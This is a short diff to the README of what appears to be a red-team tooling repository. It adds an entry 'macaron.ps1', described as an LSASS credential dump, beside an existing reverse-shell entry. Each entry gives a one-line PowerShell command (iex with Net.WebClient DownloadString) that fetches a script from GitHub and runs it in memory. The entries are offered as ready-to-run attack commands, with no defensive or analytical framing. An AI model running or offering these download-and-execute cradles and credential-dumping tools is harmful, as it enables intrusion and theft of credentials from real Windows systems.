@@ -42,3 +42,9 @@ Simple reverse shell with netcat without no obfuscation
 ``` powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/godhand.ps1') 
 ```
+
+## macaron.ps1
+Loudest LSASS dump ever
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/macaron.ps1') 
+```
